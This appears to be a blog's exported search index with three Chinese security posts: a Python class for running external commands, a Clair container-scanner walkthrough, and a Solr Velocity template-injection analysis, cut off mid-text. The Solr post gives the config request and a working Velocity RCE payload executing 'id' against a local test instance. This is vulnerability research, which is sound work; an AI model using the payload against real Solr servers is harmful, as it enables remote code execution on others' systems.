<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>dev-使用Python优雅调用其他工具或命令</title>
      <link href="/dev-%E4%BD%BF%E7%94%A8Python%E4%BC%98%E9%9B%85%E8%B0%83%E7%94%A8%E5%85%B6%E4%BB%96%E5%B7%A5%E5%85%B7%E6%88%96%E5%91%BD%E4%BB%A4/"/>
      <url>/dev-%E4%BD%BF%E7%94%A8Python%E4%BC%98%E9%9B%85%E8%B0%83%E7%94%A8%E5%85%B6%E4%BB%96%E5%B7%A5%E5%85%B7%E6%88%96%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>Python 开发扫描器时往往会调用其他第三方工具，但是通过 <code>os.system()</code>或者其他命令中是会有这样或那样的坑或不足，本文对这些问题进行总结并提出解决方案，并在结尾给出了一个封装好的类，能较为完美的解决Python调用第三方命令的问题。</p><h1 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h1><ol><li>首先，我可以调用任意命令，并且可以在命令执行时向输入通道（stdin）传更多输入，同时Python能实时获取输出通道（stdout）和错误通道（stderr）获程序输出，注意是获取输出，而不是单纯的将输出重定向到屏幕或文件中；</li><li>我可以通过返回值，或者程序输出判断第三方程序执行是否出错，如果出错抛出异常或者进行异常处理；</li><li>执行命令是最好可以设置超时时间，防止子命令假死而影响主程序；</li><li>这段调用程序应该是跨平台的，毕竟Python本身就是跨平台语言。</li></ol><a id="more"></a><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p>看到第一条和第二条需求，首先想到用 <code>subprocess.Popen()</code> 可以实现，确实，我们可以基于它进行改造，完成我们的任务。</p><p><code>subprocess.communicate()</code> 虽然可以让 Python 拿到程序返回到stdout或stderr的输出，但是它不是实时的，要想做到实时输出，首先将stdout和stderr通道重定向到<code>subprocess.PIPE</code>，这里方便起见，我先将stderr通道重定向到stdout，再将stdout重定向到<code>subprocess.PIPE</code>，注意如果是Windows平台，直接传命令是没法拿到正确的程序返回值的，因此要在后面加上<code>&amp; exit</code> 命令：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> platform.architecture()[<span class="number">-1</span>] == <span class="string">"ELF"</span>:</span><br><span class="line">    cmd = cmd</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    cmd = cmd + <span class="string">" &amp; exit"</span></span><br><span class="line">process = subprocess.Popen(cmd, shell=<span class="literal">True</span>, bufsize=<span class="number">1024</span>, stdout=subprocess.PIPE,</span><br><span class="line">                                        stderr=subprocess.STDOUT)</span><br></pre></td></tr></table></figure><p>下面考虑如何从process中拿数据的问题，这里一定要新开一个线程取数据，否则可能会出现子命令执行产生大量输出填满了subprocess的缓冲区，导致整个程序阻塞的问题：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">log_thread = threading.Thread(target=print_log, args=(process.stdout,))</span><br><span class="line">log_thread.start()</span><br></pre></td></tr></table></figure><p>以上的 <code>print_log(stdout)</code>函数用来不断向输出缓冲区取数据，并进行其他处理，这里的stdout相当于一个文件句柄，但是实践表明不能用 readline() 和readlines() 读数据，因为第三方程序输出有可能会用<code>\r</code>在同一行上多次打印输出（如在命令行显示进度条的及情况），用<code>readlines()</code>更会造成程序运行效率慢的问题（谁也不想一个日志处理环节把一个核心的CPU打满吧？），因此读取日志的函数应该这样写：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">LASTLINE=<span class="string">""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_log</span><span class="params">( stdout)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> log_line <span class="keyword">in</span> _log_line_iter(stdout):</span><br><span class="line">        process_line(log_line)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_log_line_iter</span><span class="params">(reader)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> LASTLINE</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        buf = reader.read(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> buf:</span><br><span class="line">            <span class="keyword">if</span> platform.architecture()[<span class="number">-1</span>] == <span class="string">"ELF"</span>:</span><br><span class="line">                lines = buf.decode(<span class="string">'utf8'</span>, errors=<span class="string">'ignore'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                lines = buf.decode(<span class="string">'gbk'</span>, errors=<span class="string">'ignore'</span>)</span><br><span class="line">            lines = lines.replace(<span class="string">'\r\n'</span>, <span class="string">'\n'</span>).replace(<span class="string">'\r'</span>, <span class="string">'\n'</span>).split(<span class="string">'\n'</span>)</span><br><span class="line">            lines[<span class="number">0</span>] = lastline + lines[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> lines[:<span class="number">-1</span>]:</span><br><span class="line">                <span class="keyword">if</span> len(line) &gt; <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">yield</span> line</span><br><span class="line">            lastline = lines[<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>这里用 <code>read()</code>函数从缓冲区拿数据，并且通过 <code>process_line(log_line)</code> 进行处理，这个函数就是我们可以自定的函数了，该打日志打日志，该保存保存。</p><p>接下来就是如何进行超时处理的，这里subprocess的<code>wait(timeout)</code>已经具有了超时功能，这里我们只要注意超时后将子进程杀死即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">kill</span><span class="params">(proc_pid)</span>:</span></span><br><span class="line">    process = psutil.Process(proc_pid)</span><br><span class="line">    <span class="keyword">for</span> proc <span class="keyword">in</span> process.children(recursive=<span class="literal">True</span>):</span><br><span class="line">        proc.kill()</span><br><span class="line">    process.kill()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    process.wait(timeout=timeout)</span><br><span class="line"><span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">    kill(process.pid)</span><br><span class="line">    log_thread.join()</span><br><span class="line">    <span class="keyword">raise</span></span><br></pre></td></tr></table></figure><p>注意杀死进程后，还是需要将程序最后输出获取完，再结束日志进程。</p><p>最后可以通过日志和程序返回值<code>process.returncode</code>获取程序执行情况。</p><h1 id="封装类"><a href="#封装类" class="headerlink" title="封装类"></a>封装类</h1><p>根据以上实现，本人封装了一个较为方便的超类，用的时候只需要继承这个类，再自定义打印日志和命令执行我能的回调函数即可（在回调函数中可以做异常处理）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> psutil</span><br><span class="line">OS_LINUX = <span class="string">"ELF"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">kill</span><span class="params">(proc_pid)</span>:</span></span><br><span class="line">    process = psutil.Process(proc_pid)</span><br><span class="line">    <span class="keyword">for</span> proc <span class="keyword">in</span> process.children(recursive=<span class="literal">True</span>):</span><br><span class="line">        proc.kill()</span><br><span class="line">    process.kill()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CommandRunner</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, output_size: int = <span class="number">500</span>)</span>:</span></span><br><span class="line">        self.log_size = output_size</span><br><span class="line">        self.output = list()</span><br><span class="line">        self.lastline = <span class="string">''</span></span><br><span class="line">        self.cmd = <span class="literal">None</span></span><br><span class="line">        _, os = platform.architecture()</span><br><span class="line">        self.os = OS_LINUX <span class="keyword">if</span> <span class="keyword">not</span> os <span class="keyword">else</span> os</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">log</span><span class="params">(self, log_line)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">callback</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_cmd</span><span class="params">(self, cmd: str, timeout: int = <span class="number">-1</span>)</span> -&gt; int:</span></span><br><span class="line">        logging.info(<span class="string">"Running cmd: \"&#123;&#125;\""</span>.format(cmd))</span><br><span class="line">        <span class="keyword">if</span> self.os == OS_LINUX:</span><br><span class="line">            self.cmd = cmd</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.cmd = cmd + <span class="string">" &amp; exit"</span></span><br><span class="line">        self.process = subprocess.Popen(self.cmd, shell=<span class="literal">True</span>, bufsize=<span class="number">1024</span>, stdout=subprocess.PIPE,</span><br><span class="line">                                        stderr=subprocess.STDOUT)</span><br><span class="line">        log_thread = threading.Thread(target=self.print_log, args=(self.process.stdout,))</span><br><span class="line">        log_thread.start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> timeout &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.process.wait(timeout=timeout)</span><br><span class="line">            <span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">                kill(self.process.pid)</span><br><span class="line">                log_thread.join()</span><br><span class="line">                <span class="keyword">raise</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.process.wait()</span><br><span class="line">        log_thread.join()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> self.callback()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">print_log</span><span class="params">(self, stdout)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> log_line <span class="keyword">in</span> self._log_line_iter(stdout):</span><br><span class="line">            self.log(log_line)</span><br><span class="line">            <span class="keyword">if</span> len(self.output) &gt; self.log_size:</span><br><span class="line">                <span class="keyword">del</span> self.output[<span class="number">0</span>]</span><br><span class="line">            self.output.append(log_line)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_log_line_iter</span><span class="params">(self, reader)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># fix massive log(memory error)</span></span><br><span class="line">            buf = reader.read(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> buf:</span><br><span class="line">                <span class="keyword">if</span> self.os == OS_LINUX:</span><br><span class="line">                    lines = buf.decode(<span class="string">'utf8'</span>, errors=<span class="string">'ignore'</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    lines = buf.decode(<span class="string">'gbk'</span>, errors=<span class="string">'ignore'</span>)</span><br><span class="line">                lines = lines.replace(<span class="string">'\r\n'</span>, <span class="string">'\n'</span>).replace(<span class="string">'\r'</span>, <span class="string">'\n'</span>).split(<span class="string">'\n'</span>)</span><br><span class="line">                lines[<span class="number">0</span>] = self.lastline + lines[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">for</span> line <span class="keyword">in</span> lines[:<span class="number">-1</span>]:</span><br><span class="line">                    <span class="keyword">if</span> len(line) &gt; <span class="number">0</span>:</span><br><span class="line">                        <span class="keyword">yield</span> line</span><br><span class="line">                self.lastline = lines[<span class="number">-1</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Clair初探</title>
      <link href="/container-Clair%E5%88%9D%E6%8E%A2/"/>
      <url>/container-Clair%E5%88%9D%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="Clair简介"><a href="#Clair简介" class="headerlink" title="Clair简介"></a>Clair简介</h1><p>clair是CoreOS公司开源的一套针对容器安全性检测工具，主要用于发掘容器中使用的组件是否存在安全性问题。</p><p>GitHub项目地址： <a href="https://github.com/quay/clair" target="_blank" rel="noopener">https://github.com/quay/clair</a> </p><h1 id="Clair-Framework"><a href="#Clair-Framework" class="headerlink" title="Clair Framework"></a>Clair Framework</h1><h2 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h2><ul><li>Ancestry——表示容器</li><li>Feature——容器中任何具有脆弱性的实体，如软件包和文件</li><li>Feature Namespace——Feature所在的上下文，如操作系统和编程语言</li><li>Vulnerability Source——Clair中用来跟踪上有漏洞数据库（如CVE）的组件</li><li>Vulnerability Metadata Source——漏洞元数据，用来关联上游漏洞数据和Clair数据库</li></ul><a id="more"></a><h2 id="Detector"><a href="#Detector" class="headerlink" title="Detector"></a>Detector</h2><ul><li>DataDector： 用来检测容器类型（除了docker还有appc）</li><li>FeaturesDector：发掘容器中使用的组件</li><li>NamespaceDetector：用来命名空间中存在的安全性问题</li></ul><h2 id="Updaters-amp-Notifiers"><a href="#Updaters-amp-Notifiers" class="headerlink" title="Updaters &amp; Notifiers"></a>Updaters &amp; Notifiers</h2><ul><li>updaters：用来从漏洞库里获取漏洞信息</li><li>Notifier：用来通知用户安全问题，同时支持webhook</li></ul><h2 id="Datastore"><a href="#Datastore" class="headerlink" title="Datastore"></a>Datastore</h2><p>主要用来存储漏洞数据</p><h1 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h1><h2 id="安装（Server）"><a href="#安装（Server）" class="headerlink" title="安装（Server）"></a>安装（Server）</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir clair_config</span><br><span class="line">curl -L https://raw.githubusercontent.com/coreos/clair/master/config.yaml.sample -o <span class="variable">$PWD</span>/clair_config/config.yaml</span><br><span class="line">docker run -d -e POSTGRES_PASSWORD=<span class="string">""</span> -p 5432:5432 postgres:9.6</span><br><span class="line">docker run --net=host -v <span class="variable">$PWD</span>/clair_config:/config quay.io/coreos/clair:latest -config=/config/config.yaml <span class="comment"># 选择稳定的版本</span></span><br></pre></td></tr></table></figure><p>验证：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X GET -I http://<span class="variable">$&#123;docker-host&#125;</span>:6061/health</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: clair</span><br><span class="line">Date: Sat, 16 Nov 2019 12:39:46 GMT</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure><p>如果是第一次启动需要同步数据库，如果在国内需要等待更长时间，更新完毕后可以看到如下输出：</p><p><img src="/container-Clair初探/image-20191117195355945.png" alt="image-20191117195355945"></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>刚刚启动的Clair只是一个API Server，具体API可以参考 <a href="https://app.swaggerhub.com/apis/coreos/clair/3.0" target="_blank" rel="noopener">https://app.swaggerhub.com/apis/coreos/clair/3.0</a> ，要使用它扫描<strong>本地容器</strong>可以使用<a href="https://github.com/coreos/analyze-local-images" target="_blank" rel="noopener">analyze-local-images</a>，然而Clair认为扫描本地容器不是值得提倡的实践，因此这个项目就被废弃掉了（其原理是本地启动一个dockerhub服务，但是由于docker版本问题如今已无法使用），但是类似的Client还有很多，在 <a href="https://github.com/quay/clair/blob/master/Documentation/integrations.md" target="_blank" rel="noopener">https://github.com/quay/clair/blob/master/Documentation/integrations.md</a> 上可以看到，比如<a href="https://github.com/yebinama/paclair" target="_blank" rel="noopener">paclair</a>，它允许我们将公有/私有docker仓库中的镜像上传到clair扫描，下面就以它为例，说明Clair使用方法。</p><p>安装paclair很简单：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install paclair</span><br></pre></td></tr></table></figure><p>接下来需要创建paclair配置（GitHub上还有其他仓库的配置）：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">General:</span></span><br><span class="line">  <span class="attr">clair_url:</span> <span class="string">'http://docker.test:6060'</span></span><br><span class="line"><span class="attr">Plugins:</span></span><br><span class="line">  <span class="attr">Docker:</span></span><br><span class="line">    <span class="attr">class:</span> <span class="string">paclair.plugins.docker_plugin.DockerPlugin</span></span><br><span class="line">    <span class="attr">registries:</span></span><br><span class="line">      <span class="attr">hub.docker.com:</span></span><br><span class="line">        <span class="attr">auth:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">"anemone95"</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">"***"</span></span><br></pre></td></tr></table></figure><p>假设配置文件保存为<code>paclair.yml</code>，接下来使用如下命令上传docker并启动扫描<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">paclair --debug --conf paclair.yml Docker registry.cn-hangzhou.aliyuncs.com/anemone/<span class="built_in">test</span> push <span class="comment"># 将dockerhub上的镜像上传到Clair</span></span><br><span class="line">paclair --conf paclair.yml Docker registry.cn-hangzhou.aliyuncs.com/anemone/<span class="built_in">test</span> analyse --output-format html 2&gt;result.html <span class="comment"># 扫描产生html的报告</span></span><br><span class="line">paclair --conf conf/conf.yml Docker registry.cn-hangzhou.aliyuncs.com/anemone/<span class="built_in">test</span> delete <span class="comment"># 删除容器</span></span><br></pre></td></tr></table></figure></p><p>产生的报告如下(test上的容器实际上是<code>medicean/vulapps:s_struts2_s2-037</code>：</p><p><img src="/container-Clair初探/image-20191117172303850.png" alt="image-20191117172303850"></p><p>struts2没找到漏洞，换个ssh(CVE-2017-1000117)看看，这回我们导出json格式的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">paclair --debug --conf paclair.yml Docker medicean/vulapps:s_ssh_1 push</span><br><span class="line">paclair --conf paclair.yml Docker medicean/vulapps:s_ssh_1 analyse 2&gt;ssh.json</span><br></pre></td></tr></table></figure><p>这样就找到了：</p><p><img src="/container-Clair初探/image-20191124155822590.png" alt="image-20191124155822590"></p><h1 id="报告分析"><a href="#报告分析" class="headerlink" title="报告分析"></a>报告分析</h1><p>可以看到图片上，报告中展示了容器中使用的第三方组件，如gcc， unzip，openssl，并且给出了安全等级，当前版本和修复版本，但是也可以看到其不足：</p><ul><li>对应用组件的检测能力不足，如测试镜像的主要问题在于低版本struts，但是其没有检测到</li><li>只是简单对比其组件hash，而没有更深入的检测，如即使是使用了gcc，但是容器暴漏在外部的部分并没有用，那么实际上攻击者是无法利用的；又比如空密码的redis，使用hash比较是没法测出来的。</li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Clair是一款用来扫描容器中使用第三方不安全组件的工具，能够将容器分层扫描，匹配CVE，Ubuntu，Redhat等多个数据库，个人感觉有以下优缺点：</p><p>优点：</p><ul><li>开源核心模块，方便二次开发</li></ul><p>缺点：</p><ul><li>Client使用复杂，官方给出的client——analyze-local-images已经停止维护，更强大的client需要付费使用，而其他第三方的client不一定能持续维护</li><li>文档不全，GitHub主页的quickstart都有坑，而且更多配置没有说明</li><li>对应用组件的检测能力不足</li><li>检测逻辑简单，存在漏报和误报</li></ul>]]></content>
      
      
      <categories>
          
          <category> container </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 容器安全 </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Solr Velocity模板注入漏洞分析</title>
      <link href="/vulnresearch-Solr_Velocity_injection/"/>
      <url>/vulnresearch-Solr_Velocity_injection/</url>
      
        <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>下载受影响版本的solr，这里依然选择v8.1.0，这里注意除了添加solr的jar还需要添加velocity的（源码的化可以让IDEA从maven上下源码）：</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124205421987.png" alt="image-20191124205421987"></p><p>同样的方法启动项目</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">anemone@ANEMONE-ASUS:/mnt/d/Store/document/all_my_work/solr/solr-8.1.0</span><br><span class="line">$ <span class="built_in">cd</span> server/ <span class="comment">#一定要在server下运行</span></span><br><span class="line">anemone@ANEMONE-ASUS:/mnt/d/Store/document/all_my_work/solr/solr-8.1.0/server</span><br><span class="line">$ java <span class="string">"-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=9000"</span> -Dsolr.solr.home=<span class="string">"../example/example-DIH/solr/"</span> -jar start.jar --module=http</span><br></pre></td></tr></table></figure><a id="more"></a><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><h2 id="0x00-检查core是否允许velocity"><a href="#0x00-检查core是否允许velocity" class="headerlink" title="0x00  检查core是否允许velocity"></a>0x00  检查core是否允许velocity</h2><p>检查<code>{core}/conf/solrconfig.xml</code>中是否允许solr.VelocityResponseWriter，具体来说，检查是否有如下配置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">config</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 一定要加依赖，否则会报错400，找不到velocity类 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">lib</span> <span class="attr">dir</span>=<span class="string">"$&#123;solr.install.dir:../../../..&#125;/contrib/velocity/lib"</span> <span class="attr">regex</span>=<span class="string">".*\.jar"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">lib</span> <span class="attr">dir</span>=<span class="string">"$&#123;solr.install.dir:../../../..&#125;/dist/"</span> <span class="attr">regex</span>=<span class="string">"solr-velocity-\d.*\.jar"</span> /&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 开启velocityResponse --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">queryResponseWriter</span> <span class="attr">name</span>=<span class="string">"velocity"</span> <span class="attr">class</span>=<span class="string">"solr.VelocityResponseWriter"</span> <span class="attr">startup</span>=<span class="string">"lazy"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">str</span> <span class="attr">name</span>=<span class="string">"template.base.dir"</span>&gt;</span>$&#123;velocity.template.base.dir:&#125;<span class="tag">&lt;/<span class="name">str</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">queryResponseWriter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">config</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果没有需要加上，并且重启solr</p><h2 id="0x01-设置params-resource-loader-enabled-true"><a href="#0x01-设置params-resource-loader-enabled-true" class="headerlink" title="0x01 设置params.resource.loader.enabled=true"></a>0x01 设置params.resource.loader.enabled=true</h2><p>设置VelocityResponseWriter插件的params.resource.loader.enabled选项设置为true，即允许在Solr请求参数中允许模板：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/solr/tika/config</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost:8983</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">Content-Length</span>: 259</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  "update-queryresponsewriter": &#123;</span><br><span class="line">    "startup": "lazy",</span><br><span class="line">    "name": "velocity",</span><br><span class="line">    "class": "solr.VelocityResponseWriter",</span><br><span class="line">    "template.base.dir": "",</span><br><span class="line">    "solr.resource.loader.enabled": "true",</span><br><span class="line">    "params.resource.loader.enabled": "true"</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务返回200并且观察到<code>${solr_home}/example/example-DIH/solr/tika/conf</code>下出现<code>configoverlay.json</code>表示设置成功。</p><h2 id="0x02-通过Velocity模板注入进行RCE"><a href="#0x02-通过Velocity模板注入进行RCE" class="headerlink" title="0x02 通过Velocity模板注入进行RCE"></a>0x02 通过Velocity模板注入进行RCE</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/solr/tika/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost.com:8983</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure><p>返回包中看到命令执行结果：</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124164155298.png" alt="image-20191124164155298"></p><h3 id="Velocity-RCE方法"><a href="#Velocity-RCE方法" class="headerlink" title="Velocity RCE方法"></a>Velocity RCE方法</h3><p>urldecode一下，可以看到velocity进行RCE的payload，留着以后可能有用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#set($x=&apos;&apos;) </span><br><span class="line">#set($rt=$x.class.forName(&apos;java.lang.Runtime&apos;)) </span><br><span class="line">#set($chr=$x.class.forName(&apos;java.lang.Character&apos;)) </span><br><span class="line">#set($str=$x.class.forName(&apos;java.lang.String&apos;)) </span><br><span 